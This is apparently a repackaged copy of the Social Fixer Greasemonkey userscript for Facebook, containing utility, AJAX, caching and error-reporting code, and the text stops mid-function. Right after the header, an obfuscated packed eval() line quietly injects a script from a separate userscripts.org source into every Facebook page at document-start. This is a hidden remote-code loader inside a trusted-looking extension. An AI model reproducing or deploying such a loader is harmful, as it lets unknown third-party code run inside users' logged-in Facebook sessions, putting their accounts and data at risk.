// ==UserScript==
// @name           Social Fixer Plus
// @namespace      http://userscripts.org/users/86416
// @include        http://*.facebook.com/*
// @include        http://facebook.com/*
// @include        http://www.facebook.com/*
// @include        https://www.facebook.com/*
// @include        https://*.facebook.com/*
// @include        https://facebook.com/*
// @include        http://*.facebook.tld/*
// @include        http://facebook.tld/*
// @include        https://*.facebook.tld/*
// @include        https://facebook.tld/*
// @exclude        http://*.channel.facebook.tld/*
// @exclude        http://static.*.facebook.tld/*
// @exclude        http://*.facebook.tld/ai.php*
// @exclude        http://*.facebook.tld/pagelet/generic.php/pagelet/home/morestories.php*
// @exclude        https://*.channel.facebook.tld/*
// @exclude        https://static.*.facebook.tld/*
// @exclude        https://*.facebook.tld/ai.php*
// @exclude        https://*.facebook.tld/pagelet/generic.php/pagelet/home/morestories.php*
// @run-at         document-start
// @version        7.501
// @updateURL      https://socialfixer.com/greasemonkey_update.js
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))






/* 
Social Fixer
(c) 2009-2012 Matt Kruse
http://SocialFixer.com
*/
var version = 7.501;
var SCRIPT_TYPE = "greasemonkey";
var undef;
var config_url = "http://socialfixer.com/config7.json?type="+SCRIPT_TYPE+"&version="+version;

// Check to see if we're running before DOMContentLoaded
var is_document_ready = function() { 
	if(document && document.readyState) { return (document.readyState=="interactive"||document.readyState=="complete") }
	return (document && document.getElementsByTagName && document.getElementsByTagName('BODY').length>0); 
}
var runat = is_document_ready()?"document-end":"document-start";

// Main Script
// -----------

try {




	// ==================================================================
	// LOGGING
	// ==================================================================
	var console_logging_enabled = true;
	var log = (function() {
		var buffer=[];
		var polling = false;
		var poll=function(func,interval,max){interval=interval||500;max=max||50;var count=0;var f=function(){ if(count++>max){return;}try{if (func(count)===false){ setTimeout(f,interval); }}catch(e){setTimeout(f,interval);} };f();};
		return function(a,b,c,d,e,f,g,h) {
			if(console_logging_enabled&&unsafeWindow&&unsafeWindow.console&&unsafeWindow.console.debug) { 
				unsafeWindow.console.debug.apply(unsafeWindow.console,arguments); 
			}
			else {
				polling = true;
				buffer.push(arguments);
				poll(function() {
					if(unsafeWindow&&unsafeWindow.console&&unsafeWindow.console.debug) { 
						if (console_logging_enabled) {
							try {
								unsafeWindow.console.debug.apply(this,"[Social Fixer]","Starting logging...");
							} catch(e) { return false;}
							for (var i=0; i<buffer.length; i++) {
								unsafeWindow.console.debug.apply(this,buffer[i]);
							}
						}
						buffer = [];
					}
					else {
						return false;
					}
				},100,100);
			}
		}
	})();
	// ==================================================================
	// UTILITY functions
	// ==================================================================
	var internalUpdate = false; // FLAG to keep track of internal moves which should NOT trigger the DOMNodeInserted hooks!
	var html=function(el,h,append){
		internalUpdate=true; 
		if (typeof append!="boolean") { append=false; }
		if(typeof el=='string'){el=document.getElementById(el);}
		if(el){
			// TODO: Sanitize HTML output received from ajax calls
			if (false && SCRIPT_TYPE=="firefox_addon_official" && el.appendChild) {
				try {
					if (!append) {
						while (el.hasChildNodes()) { el.removeChild(el.lastChild); }
					}
					if (h!='') {
						var node = GM_sanitize(h,el);
						el.appendChild(node);
						log("[html]",el,node,h);
					}
				}
				catch (e) { 
					log("[html ERROR]",e.toString(),el,h); 
					if (append) { el.innerHTML+=h; }
					else { el.innerHTML=h; }
				}
			}
			else {
				if (append) { el.innerHTML+=h; }
				else { el.innerHTML=h; }
			}
		} 
		internalUpdate=false;
	};
	var appendhtml=function(el,h){html(el,h,true);}

function htmlescape(str) { if(typeof str=="string") { return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,"&quot;"); } return ""; }
function jsescape(str) { if(typeof str=="string") { return str.replace(/'/g,"\\'").replace(/"/g,'\\"'); } return ""; }
function parse(str) { try { return JSON.parse(str); } catch (e) { return {}; } }
function _template(s) {for (var i=1; i<arguments.length; i++) {var arg = arguments[i];if ("object"==typeof arg) { for (var key in arg) { var val = arg[key]; if (typeof val=='undefined') {val = '';} s = s.replace( new RegExp("%"+key+"%","g"),val); } }		else { s = s.replace( new RegExp("%"+i+"%","g"),arg); }	}return s;}
var convert_string_to_regex_matches = {};
function convert_string_to_regex(str) {if (typeof convert_string_to_regex_matches[str]!="undefined") { return convert_string_to_regex_matches[str]; }try {var matches = str.match(/^\/(.*?)\/(\w*)$/);var re = new RegExp(matches[1],matches[2]);convert_string_to_regex_matches[str] = re;return re;}	catch(e) { convert_string_to_regex_matches[str] = null; return null; }}
function trim(str) { if(!str){return str;} if (str.trim) { return str.trim(); } return str.replace(/^(\s|\u00A0)+|(\s|\u00A0)+$/g,""); }
function $(id,prop) { var el=document.getElementById(id); if(!el){return el;} if(typeof prop!="undefined"){return el[prop];} return el;}
function $first(o,cn,func) {if(!o){return null;} if (o && o.getElementsByClassName) { var cns = o.getElementsByClassName(cn); if (cns && cns.length) { if(func) { func(cns[0],o); }; return cns[0]; } } return null; }
function $$(cn,func,context) { $each((context||document).getElementsByClassName(cn),func); }
function $each(els,func){ if (els && els.length) { if (typeof func=="string") { func = new Function(func); } for (var i=els.length-1; i>=0; i--) { func.call(els[i],els[i]); } } }
function $tagname(o,tagname,func) { if(!o){return;}$each(o.getElementsByTagName(tagname),func); }
function bind(el,ev,func,capture) { if (typeof el=="string") { el = $(el); } if (typeof func=="string") { func = new Function(func); } if(typeof capture!="boolean"){capture=false;} if (el && el.addEventListener) { el.addEventListener(ev,func,capture); } }
function click(el,func,cancelBubble) { bind(el,'click',function(e) { func.call(this,e); if(cancelBubble!==false){ cancel_bubble(e);} },false); }
function cancel_bubble(e) { if(e && e.stopPropagation){e.stopPropagation();} }
function prevent_default(e) { if(e && e.preventDefault){e.preventDefault();} }
function hasClass(o,re) {if(!o){return false;}if (typeof re=="string") {re = new RegExp("(^|\\s)"+re+"(\\s|$)");}return (o.className && re.test(o.className));}
function addClass(o,cn) {if(!o){return;}if (o.className==null || o.className=='') { o.className = cn; return;}if (hasClass(o,cn)) { return; }o.className = o.className + " " + cn; }
function removeClass(o,re) {if(!o){return;} if (!hasClass(o,re)) { return; } if (typeof re=="string") { re = new RegExp("(^|\\s)"+re+"(\\s|$)"); } o.className = o.className.replace(re,' '); }
function toggleClass(o,cn) {if(!o){return;} if(hasClass(o,cn)) { removeClass(o,cn); } else { addClass(o,cn); } }
function getParentByClass(el,cn){ if (hasClass(el,cn)){return el;} while(el=el.parentNode) { if(hasClass(el,cn)) { return el; } } return null; }
function parent(el,selector){ if (!el||!el.parentNode){return null;} if(!selector){return el.parentNode;} if (matchesSelector(el,selector)){return el;} while(el=el.parentNode) { if(matchesSelector(el,selector)) { return el; } } return null; }
function getParentByTag(el,tn){ tn=tn.toLowerCase();while(el=el.parentNode) { if(el && el.tagName && tn==el.tagName.toLowerCase()) { return el; } } return null; }
function parentChain(o){var s="";while(o){s+=outerHTML(o);o=o.parentNode;}return s;}
function outerHTML(o,esc){if(!o || !o.tagName){return (esc?"&lt;&gt;":"<>");}return (esc?"&lt;":"<")+o.tagName+(o.id?" id="+o.id:"")+(o.className?" class="+o.className:"")+(esc?"&gt;":">");}
function innerText(o){if(!o){return"";}if(typeof o.textContent!="undefined"){return o.textContent;} if(typeof o.innerText!="undefined"){return o.innerText;} return o.innerHTML;}
function prev(o,tag){if(!o){return null;}while(o=o.previousSibling){if(o.tagName==tag){return o;}}return null;}
function next(o,tag){if(!o){return null;}while(o=o.nextSibling){if(o.tagName==tag){return o;}}return null;}
function css(el,rules){rules.split(/\s*;\s*/).foreach(function(){ var keyval=this.split(':'); el.style[keyval[0]]=keyval[1]; });}
function removeChild(o){if(o&&o.parentNode&&o.parentNode.removeChild){o.parentNode.removeChild(o);}}
function QS(o,query,propfunc){if(typeof o=="string"){propfunc=query;query=o;o=document;}if(!o||!o.querySelector){return null;}var m=o.querySelector(query);if(!m){return null;}if(typeof propfunc=="undefined"){return m;}if(typeof propfunc=="function"){return propfunc(m);}return m[propfunc];}
function QSA(o,query,func){if(typeof o=="string"){propfunc=query;query=o;o=document;}if(!o||!o.querySelectorAll){return null;}var m=o.querySelectorAll(query);if(!m||m.length==0){return null;}if (typeof func=="string") { func = new Function(func); }if(typeof func!="function"){return m;}for(var i=0;i<m.length;i++){func.call(m[i],m[i]);}return m;}
function match(str,regex,func){if(typeof str!="string"){return null;}var m=str.match(regex);if(m&&m.length){if(typeof func=="function"){for (var i=regex.global?0:1;i<m.length;i++){func(m[i]);}return m;}else{return m.length>1?m[regex.global?0:1]:null;}}return null;}
function url_param(url,param){return unescape(match(url,new RegExp(param+'=([^&]+)','i'))); }
function encode_url_params(o){var u="";for(var i in o){if(u!=""){u+="&";}u+=encodeURIComponent(i)+"="+encodeURIComponent(o[i]);}return u;}
function clickLink(el,bubble) {if(!el){return;}if(typeof bubble!="boolean"){bubble=true;}var e = document.createEvent('MouseEvents');e.initEvent('click',bubble,true,window,0);el.dispatchEvent(e);}
function mouseEvent(el,event,bubble) {if(!el){return;}if(typeof bubble!="boolean"){bubble=true;}var e = document.createEvent('MouseEvents');e.initEvent(event,bubble,true,window,0);el.dispatchEvent(e);}
function press_key(o,code,type) { if(!o){return;}type=type||"keypress";var e=document.createEvent('KeyboardEvent'); if(typeof code=="string"){code=code.charCodeAt(0);} 
	if (e.initKeyboardEvent) {
		e.initKeyboardEvent(type,true,true,window,code,null,null);
	}
	else if (e.initKeyEvent) {
		e.initKeyEvent(type,true,true,window,false,false,false,false,false,code);  
	}
	o.dispatchEvent(e); }
function time() { return (new Date()).getTime(); }
function delay(func,t){if(typeof t=="function"){var temp=t;t=func;func=temp;}return setTimeout(func,t||10);}
var idle_wait = (function() {
	var keys = {};
	return function(key,t,func) {
		if (keys[key]) {
			clearTimeout(keys[key]);
		}
		keys[key] = setTimeout(func,t||500);
		return keys[key];
	};
})();
function split(str,del){if(typeof str!="string"){return [];}if(!str||!str.split){return [str];}return str.split(del);}
function hide(o){if(o&&o.style){o.style.display="none"; if(o.style.setProperty){o.style.setProperty("display", "none", "important");} }}
function show(o){if(o&&o.style){o.style.display="block";}}
function target(e){ var t=e.target; if (t.nodeType == 3){t=t.parentNode;} return t; }
function to_array(o){ var a=[]; if(o&&o.length) { for (var i=0;i<o.length;i++) { a.push(o[i]); } } return a; }
function object_to_array(o,key,desc){ var i,a=[]; for(i in o){ a.push(o[i]); } if(key){ return sort_array(a,key,desc); } return a; }
function array_to_object(a){var o={};if(a && a.length){for(var i=0;i<a.length;i++){o[a[i]]=a[i];} }return o; }
function sort_array(arr,key,desc){ var before=desc?-1:1; var after=desc?1:-1; return arr.sort( function(a,b){ var ta=typeof a[key]; var tb=typeof b[key]; if (ta=="undefined" && tb=="undefined"){return 0;} if (tb=="undefined"){return before;} if(ta=="undefined"){return after;} return (a[key]>b[key])?before:a[key]==b[key]?0:after; } ); }
function foreach(o,sorttype,func) {var a=[];for (var i in o) { a.push(i); }if (sorttype=='key') { a=a.sort(); }else if (sorttype=='value') { a=a.sort(function(a,b){ return (o[a]>o[b])?-1:o[a]==o[b]?0:1; }); }$each(a,function(){func(this,o[this])});}
function poll(func,interval,max){interval=interval||500;max=max||50;var count=0;var f=function(){ if(count++>max){return;}try{if (func(count)===false){ setTimeout(f,interval); }}catch(e){setTimeout(f,interval);} };f();}
// Add CSS to the page
function add_css(css,id) {
	var style = document.createElement('style');
	if(id){style.id=id;}
	style.textContent = css;
	poll(function() {
		document.getElementsByTagName('head')[0].appendChild(style);
	},200,20);
}
function add_style(css,id,func) {
	if (!document || !document.getElementsByTagName) { return false; }
	var style;
	try {
		if (id) { style = document.getElementById(id); }
		if (!style) {
			style = document.createElement('style');
			if (id) { style.id=id; }
			document.getElementsByTagName('head')[0].appendChild(style);
		}
		if (css!==null) { style.textContent = css; }
		if (typeof func=="function") {
			func(style,trim(style.textContent));
		}
		return style;
	} catch(e) { return false; }
}
// Mutation functions
// These set an internal flag to denote that we are doing the mutating, so the DOMNodeInserted handlers don't fire
function append(to,el){if(to&&to.appendChild){ internalUpdate=true; for(var i=1; i<arguments.length; i++) { to.appendChild(arguments[i]); } internalUpdate=false; }; return to;}
function insertBefore(el,ref){internalUpdate=true; if(ref&&ref.parentNode){ref.parentNode.insertBefore(el,ref); internalUpdate=false;}};
function insertFirst(container,el) {insertAtPosition(container,el,1); }
function insertAtPosition(container,el,pos) {if (container && container.childNodes && container.childNodes.length) {var l = container.childNodes.length;if (pos<1) { pos=l+pos+1;}if (pos<1) { pos=1; } if (l>pos-1) { insertBefore(el, container.childNodes[pos-1]); } else { append(container,el); } }}
function insertAfter(el,ref) { var container, ns; if ( (container=ref.parentNode) && (ns=ref.nextSibling) ) { insertBefore(el, ns); } else if (container) { append(container,el); } return el; }
function body() { if (document.documentElement) {return document.documentElement;} return document.body; }
function scroll_to_top() {if (document.documentElement) {document.documentElement.scrollTop = 0;} if (document.body) {document.body.scrollTop = 0;}}
function delimited_string_add(str,add,del){str = str||"";del=del||",";var re = RegExp("(^|"+del+")"+add+"("+del+"|$)");if(!re.test(str)){str+=((str!="")?del:"")+add;}return str;}
function ago(when,now,shortened) {var diff = Math.floor((now-when)/1000/60);if (diff<60) { return diff+" "+(shortened?"min":"minutes")+" ago"; }diff = Math.floor(diff/60);if (diff<24) { return diff+" "+(shortened?"hr":"hours")+" ago"; }diff = Math.floor(diff/24);return diff+" days ago";}
function setSelectionRange(input, selectionStart, selectionEnd) {if (input.setSelectionRange) {input.focus();input.setSelectionRange(selectionStart, selectionEnd);}else if (input.createTextRange) {var range = input.createTextRange();range.collapse(true);range.moveEnd('character', selectionEnd);range.moveStart('character', selectionStart);range.select();}}
function setCaretToPos (input, pos) {setSelectionRange(input, pos, pos);}
function cookie(n) { try { return unescape(document.cookie.match('(^|;)?'+n+'=([^;]*)(;|$)')[2]); } catch(e) { return null; } }
function current_style(o,s){ var a=window.getComputedStyle(o,null); if (a) { return a.getPropertyValue(s); } return null; }
function is_visible(o){var v=current_style(o,'display');return (v&&v!='none');}
function offset(obj) {
	var x,y,box;
	if (obj.getBoundingClientRect) {
		box = obj.getBoundingClientRect();
		x = box.left + (document.documentElement.scrollLeft||document.body.scrollLeft);
		y = box.top + (document.documentElement.scrollTop||document.body.scrollTop);
	}
	else {
		x= +obj.offsetLeft, y=+obj.offsetTop;
		while(obj=obj.offsetParent) {
			if (obj.offsetLeft) { x+= +obj.offsetLeft; }
			if (obj.offsetTop) { y+= +obj.offsetTop; }
		}
	}
	return {left:x,top:y};
}
function matchesSelector(o,sel){
	if (o.matchesSelector){return o.matchesSelector(sel);}
	if (o.mozMatchesSelector){return o.mozMatchesSelector(sel);}
	if (o.webkitMatchesSelector){return o.webkitMatchesSelector(sel);}
	if (o.querySelectorAll && o.parentNode) {
		var matches = o.parentNode.querySelectorAll(sel);
		if (matches && matches.length) {
			for (var i=0; i<matches.length; i++) {
				if (matches[i]===o) { return true; }
			}
		}
	}
	return;
}
// ELEMENT CREATION
function el(type,cn,props,events,innerHTML,style) {
	var o = document.createElement(type);
	if (cn) { o.className=cn; }
	if (props) {for (var i in props) {o[i] = props[i];}}
	if (events) {for (i in events) {o.addEventListener(i,events[i],false);}}
	if (innerHTML) {html(o,innerHTML);}
	if (style) {for (i in style) {o.style[i]=style[i];}}
	return o;
}
function button(value,onclick,id,cn,title) {
	var button = el( 'input','',{type:'button','value':value},{click:onclick} );
	if (title) {
		button.title=title;
		button.setAttribute('data-hover','tooltip');
	}
	var span = el('label',(cn||'uiButton UIButton UIButton_Blue UIFormButton UIButton_better_fb'),{'id':id});
	append(span,button);
	return span;
}
function message(str,okFunc,obj) {
	var msg = el('div','better_fb_message');
	html( msg, '<div class="better_fb_bulb_spacer"></div>'+str );
	if (obj) { append(msg,obj); }
	okFunc = okFunc || (function(){});
	var ok = el('span','better_fb_close',{innerHTML:'OK'},{click:function() { okFunc(); this.parentNode.parentNode.style.display='none'; } } );
	var ok_wrap = el('div','bfb_close_wrap');
	append(ok_wrap,ok);
	append(msg,ok_wrap);
	append(msg,el('div','bfb_clear'));
	return msg;
}
function minimessage(str,okFunc,css) {
	var rule;
	okFunc = okFunc || (function(){});
	var mm = el('div','better_fb_mini_message',{innerHTML:str,title:'Click to close message'},{click:function(e) { 
		var t=target(e); 
		if(!t.tagName||t.tagName!="A") {
			okFunc(); 
			this.style.display='none';
		}
	}} );
	if (css && mm.style) {
		for (rule in css) {
			mm.style[rule] = css[rule];
		}
	}
	return mm;
}
function quickmessage(str,duration,func,style,remove) {
	duration = duration||5;
	var container = $('bfb_quickmessages');
	if (!container) {
		container = el('div',null,{id:'bfb_quickmessages'});
		append(document.body,container);
		container = $('bfb_quickmessages');
	}
	var msg = el('div','bfb_quickmessage mini_x',{title:'Click to hide'},{click:function(){if (typeof func=="function") {func();};this.style.display='none';}},str,{cursor:'pointer'});
	if (style) { for(var o in style){msg.style[o]=style[o];} }
	append(container,msg);
	setTimeout( function() { 
		if (typeof remove!="boolean" || remove!==false) {
			removeChild(msg); 
		}
	}, duration*1000 );
}

// Subscribing to Facebook's Arbiter-controlled events
var arbiter_subscriptions = {};
function subscribe(event,func) {
	poll(function() {
		if (unsafeWindow && unsafeWindow.Arbiter && typeof unsafeWindow.Arbiter.subscribe=="function") {
			if (typeof arbiter_subscriptions[event]=="undefined") {
				arbiter_subscriptions[event]=[];
			}
			var delayed_func = function(a,b) { setTimeout(function(){ func(a,b); },10); }
			arbiter_subscriptions[event].push(delayed_func);
			return unsafeWindow.Arbiter.subscribe(event,delayed_func);
		}
		else {
			return false;
		}
	},100,50);
}
function resubscribe_all() {
	for (var event in arbiter_subscriptions) {
		var l = arbiter_subscriptions[event];
		for (var i=0;i<l.length; i++) {
			unsafeWindow.Arbiter.subscribe(event,l[i]);
		}
	}
}	function onDOMContentLoaded(func) {
		if (is_document_ready()) { func(); }
		else { bind(window,'DOMContentLoaded',func,false); }
	}

	function is_timeline() { return !!QS(document,'.timelineLayout'); }
// ==================================================================
// AJAX
// ==================================================================
var ajax = function(props) { 
	log("[ajax]",props);
	var cache = props.cache;
	if (cache>0 || cache===true) {
		if (cache===true) {
			cache = 1*(1000*60*60*24); // Default to 1 day
		}
		// Check to see if the data is cached
		if (!props.invalidate_cache) {
			var cached_content = ls.get(props.url);
			if (cached_content) {
				log("[ajax]","Returning cached content");
				// Wrap it in a simulated response and call the callback function
				props.onload( {"status":200,"cached":true,"responseText":cached_content} );
				return;
			}
		}
		var original_onload = props.onload;
		var cache_url = props.url;
		if (props.invalidate_cache) {
			props.url = props.url+(props.url.indexOf("?")>0?"&":"?")+"rand="+time()
		}
		var new_onload = function(res) {
			if (res && res.responseText) {
				ls.cache(cache_url,res.responseText,cache);
			}
			// Call the original onload handler
			original_onload(res);
		};
		props.onload = new_onload;
	}
	if (!props.method) { props.method='GET'; }
	onDOMContentLoaded(function() {
		GM_xmlhttpRequest(props);
	});
}
var simple_ajax = function(url,func) {
	return ajax({'url':url,'onload':function(res) {
		if (res) { func(res); }
	}});
};
// Load the content of an element via ajax call
var ajax_load = function(el,url,cache,msg,spinner,func) {
	if (msg) {
		if (spinner) {
			msg += '<br><img src="data:image/gif;base64,R0lGODlhEAALALMMAOXp8a2503CHtOrt9L3G2%2BDl7vL0%2BJ6sy4yew1Jvp%2FT2%2Be%2Fy9v%2F%2F%2FwAAAAAAAAAAACH%2FC05FVFNDQVBFMi4wAwEAAAAh%2BQQFCwAMACwAAAAAEAALAAAEK5DJSau91KxlpObepinKIi2kyaAlq7pnCq9p3NZ0aW%2F47H4dBjAEwhiPlAgAIfkECQsADAAsAAAAAAQACwAABA9QpCQRmhbflPnu4HdJVAQAIfkECQsADAAsAAAAABAACwAABDKQySlSEnOGc4JMCJJk0kEQxxeOpImqIsm4KQPG7VnfbEbDvcnPtpINebJNByiTVS6yCAAh%2BQQJCwAMACwAAAAAEAALAAAEPpDJSaVISVQWzglSgiAJUBSAdBDEEY5JMQyFyrqMSMq03b67WY2x%2BuVgvGERp4sJfUyYCQUFJjadj3WzuWQiACH5BAkLAAwALAAAAAAQAAsAAAQ9kMlJq73hnGDWMhJQFIB0EMSxKMoiFcNQmKjKugws0%2BnavrEZ49S7AXfDmg%2BnExIPnU9oVEqmLpXMBouNAAAh%2BQQFCwAMACwAAAAAEAALAAAEM5DJSau91KxlpOYSUBTAoiiLZKJSMQzFmjJy%2B8bnXDMuvO89HIuWs8E%2BHQYyNAJgntBKBAAh%2BQQFFAAMACwMAAIABAAHAAAEDNCsJZWaFt%2BV%2BZVUBAA7">';
		}
		msg = '<div class="sfx_ajax_load" style="vertical-align:middle;text-align:center;">'+msg+'</div>';
		html(el,msg);
	}
	ajax({'cache':cache,'method':'GET','url':url,'onload':function(res) { 
		if (el && res && res.responseText) {
			if (res.cached) {
				addClass(el,"sfx_cached");
			}
			html(el,res.responseText);
		}
		if (func) {
			func(res,el);
		}
	}});
}
// ==================================================================
// localStorage interface
// ==================================================================
var store = null;
try {
	store = unsafeWindow.localStorage;
} catch(e) { }
var ls = {
	'prefix':'sfx_',
	'delete_if_expired':function(key) {
		if (store==null) { return false; }
		var expire_on = store.getItem(key+"_expire_on");
		// Check to see if the cached content has expired
		if (expire_on && (new Date()).getTime()> +expire_on) {
			// Expired already, delete it and return true
			this.delete(key);
			this.delete(key+"_expire_on");
			return true;
		}
		return false;
	},
	'prune':function() {
		if (store==null) { return false; }
		// Delete the oldest key, even if not expired
		// First build a list of all keys that have an expiration time
		var k,expirable = [];
		for (k in store) {
			if (/_expire_on$/.test(k)) {
				var o = {}; 
				o['expires'] = store[k];
				o['key'] = k.replace(/_expire_on/,'');
				expirable.push(o);
			}
		}
		if (expirable.length==0) { return false; }
		expirable = sort_array(expirable,'expires');
		// The first entry is the oldest
		this.delete(expirable[0].key);
		return true; // We pruned one
	},
	'get':function(key){ 
		if (store==null) { return null; }
		if (!store || !store.getItem) { return null; }
		key = this.prefix+key;
		if (this.delete_if_expired(key)) {
			return null;
		}
		return store.getItem(key);
	},
	'set':function(key,val) {
		var k;
		if (!store || !store.setItem) { return false; }
		key = this.prefix+key;
		try {
			store.setItem(key,val);
		} catch(e) {
			try {
				this.clean();
				store.setItem(key,val);
			}
			catch(e) {
				// Now try pruning old ones until we free up enough space
				var tries = 0;
				while (tries++<20 && this.prune()) {
					try {
						store.setItem(key,val);
						return true;
					}
					catch (e) {
						// FAIL! Try again!
					}
				}
				// If we tried 20 times and failed, we're lost
				return false;
			}
		}
		return true;
	},
	'delete':function(key) {
		if (!store || !store.deleteItem) { return null; }
		store.removeItem(key);
		store.removeItem(key+"_expire_on");
	},
	'cache':function(key,val,ttl) {
		if (store==null) { return false; }
		ttl = ttl || 8640000; // Default to 1 day
		this.set(key,val);
		var expire_key = key+"_expire_on";
		if (ttl>0) {
			var expire = (new Date()).getTime() + (ttl*1000);
			this.set(expire_key,expire);
		}
		else {
			this.deleteItem(expire_key);
		}
	},
	'clean':function() {
		if (store==null) { return false; }
		// Loop through each key, find any of mine that are expired, delete them, then try again
		for (k in store) {
			this.delete_if_expired(k);
		}
	},
	'clear':function(warn) {
		if (store==null) { return false; }
		var k;
		var dump = (this.dump() || "").substr(0,500);
		if ((typeof warn=="boolean" && !warn) || confirm("The cache contains:\n"+dump+"\n\nAre you sure you want to clear the cache?")) {
			for (k in store) {
				if (/^sfx_/.test(k)) {
					store.removeItem(k);
				}
			}
		}
	},
	'dump': function() {
		if (store==null) { return false; }
		var s = "";
		for (var i in store) {
			if (/^sfx_/.test(i)) {
				s += i+":"+store.getItem(i).substring(0,25)+"\n";
			}
		}
		return s;
	}
};

	// ==================================================================
	// ERROR REPORTING
	// Setup error-reporting really early so we can trap early errors
	// ==================================================================
	var error_container = null;
	var error_list = [];
	var unique_errors = {};
	function add_error(msg,data,classname,func,properties) {
		if (data) {
			msg+='<div class="bfb_data">'+(htmlescape(data).replace(/\n/g,"<br>"))+'</div>';
		}
		if (typeof unique_errors[msg]!="undefined") { return; }
		unique_errors[msg]=true;
		error_list.push( {text:msg,c:classname,onclick:func,props:properties} );
		increment_badge_counter();
		render_errors();
	}
	function add_exception(e) {
		var str = e.toString(); 
		if(e.lineNumber){ str+=" line #"+e.lineNumber; } 
		add_error(str);
	}
	function render_errors() {
		if (error_container && error_list.length>0) {
			for (var i=0; i<error_list.length; i++) {
				var o = error_list[i];
				var cn = 'bfb_error'+(o.c?' '+o.c:'');
				var props = o.props || {};
				var func = function() {
					removeChild(this);
					increment_badge_counter(-1);
				}
				if (o.onclick) {
					func = o.onclick;
				}
				else {
					props.title = "Click to remove error";
				}
				var d = el('div',cn,props,{click:func},o.text);
				append(error_container,d);
			}
			error_list = [];
		}
	}

	// ==================================================================
	// Options Icon Badge Counter
	// ==================================================================
	var badge_counter = null;
	var badge_count = 0;
	function increment_badge_counter(count) {
		badge_count += (count || 1);
		render_badge_counter();
	}
	function render_badge_counter() {
		if (badge_counter!=null) {
			if (badge_count>0) {
				html(badge_counter,badge_count);
				badge_counter.parentNode.style.display="block";
			}
			else {
				html(badge_counter,'');
				badge_counter.parentNode.style.display="none";
			}
		}
	}

	// Make sure we only run once per page. Greasemonkey has a bug triggered by Facebook's replaceState() call that makes it run scripts twice.
	if (typeof unsafeWindow.sfx=="undefined") {
		unsafeWindow.sfx=true;
		var main = (function() { 
			try { // GLOBAL WRAPPER

				log("[Social Fixer]","running");
				log("runat",runat);
				// ==================================================================
				// Get remote data from socialfixer.com
				// ==================================================================
				var config_data = null;
				function get_config_data(key,func,failfunc,invalidate_cache) {
					if (config_data!=null && !invalidate_cache) {
						return func(config_data.data[key]);
					}
					ajax({cache:true,'invalidate_cache':!!invalidate_cache,url:config_url,onload:function(res) {
						try {
							config_data = JSON.parse(res.responseText);
							func(config_data.data[key]);
						} catch(e) { 
							if (failfunc) {
								failfunc(e);
							}
						}
					}});
				}

				// ==================================================================
				// Don't run on link redirects and some other cases
				// ==================================================================
				var excludes = ['/l.php?u','/ai.php','/plugins/','morestories.php'];
				try {
					for (var i=0; i<excludes.length; i++) {
						if (location.href.indexOf(excludes[i])>0 ) { return; }
					}
				} catch(e) { }

// ==================================================================
// Extension Option Persistence
// ==================================================================
function setValue(key,val,func) { 
	log("[setValue]",key);
	var do_set=function() { 
		try { 
			GM_setValue(key,val); 
		} catch(e) { 
			alert(e); 
		} 
		if(func) { 
			func(key,val); 
		} 
		
	};
	window.setTimeout(do_set,0);
}
function getValue(key, def, func) {
	// Key can be either a single key or an array of keys
	if (typeof key=="string") {
		return func(GM_getValue(key,def));
	}
	else if (typeof key=="object" && key.length) {
		var values = {};
		for (var i=0; i<key.length; i++) {
			var default_value = undef;
			if (typeof def=="object" && def.length && i<def.length) {
				default_value = def[i];
			}
			values[key[i]] = GM_getValue(key[i],default_value);
		}
		if (func) {
			return func(values);
		}
		else { return values; }
	}
    return undef;
}




				// ==================================================================
				// Turn off auto-loading of Older Posts when footer is scrolled into 
				// view. FB's code sucks and breaks when there are no posts and the
				// footer is visible immediately!
				// ==================================================================
				function setScrollLoad(enabled) {
					try { 
						if(unsafeWindow.disableScrollLoad !== !enabled) {
							log('[disableScrollLoad]','current=',unsafeWindow.disableScrollLoad,'new=',!enabled);
						}
						unsafeWindow.disableScrollLoad=!enabled;
					} catch(e) { }
				}
				setScrollLoad(false);

				// ==================================================================
				// DOM INSERTION
				// ==================================================================
				// Trigger a function when an element with a certain ID is added to the document
				function onIdLoad(id,func,watch_stream) {
					var o = document.getElementById(id);
					if (o) { func(o,id,o); } // Call it right away if it already exists
					watchDOMNodeInserted('#'+id,func,watch_stream);
				}
				// Trigger a function when elements matching a selector is added to the document
				function onSelectorLoad(selector,func,watch_stream) {
					var els = document.querySelectorAll(selector);
					if (els && els.length) { // Call it right away if it already exists
						for (var i=0; i<els.length; i++) {
							func(els[i],selector);
						}
					} 
					watchDOMNodeInserted(selector,func,watch_stream);
				}
				var domNodeInsertedHandlers = {};
				var domNodeInsertedStreamHandlers = {};
				function watchDOMNodeInserted(selector,func,watch_stream) {
					var f = {"selector":selector,"handler":func};
					if (watch_stream==="both" || watch_stream) {
						if (typeof domNodeInsertedStreamHandlers[selector]=="undefined") {
							domNodeInsertedStreamHandlers[selector]=[];
						}
						domNodeInsertedStreamHandlers[selector].push(f);
					}
					if (watch_stream==="both" || !watch_stream) {
						if (typeof domNodeInsertedHandlers[selector]=="undefined") {
							domNodeInsertedHandlers[selector]=[];
						}
						domNodeInsertedHandlers[selector].push(f);
					}
				}
				// Fire a list of handlers on an element when it is inserted
				function elementLoad(o,handler_list) {
					delay(function() {
						for (selector in handler_list) {
							var els= to_array(o.querySelectorAll(selector));
							if (matchesSelector(o,selector)) {
								els.push(o);
							}
							if (els) {
								var funcs = handler_list[selector];
								for (var i=0; i<funcs.length; i++) {
									for (var j=0; j<els.length; j++) {
										funcs[i].handler(els[j],selector,o); 
									}
								}
							}
						}
					},10);
				}

				// ===================================================
				// Theme CSS
				// ===================================================
				function insertStylesheet(url,id) { 
					log("[insertStylesheet]",url,id);
					// If the url is from socialfixer.com, load it via ajax and cache it
					if (SCRIPT_TYPE=="greasemonkey" || /socialfixer\.com/i.test(url)) {
						log("[insertStylesheet]","Loading remote CSS");
						ajax({'cache':true,method:'GET','url':url,'onload':function(res) {
							log("[insertStylesheet]",'cached:',res.cached);
							var css = id?'':'';
							add_css(css+res.responseText,id);
						}});
					}
					else {
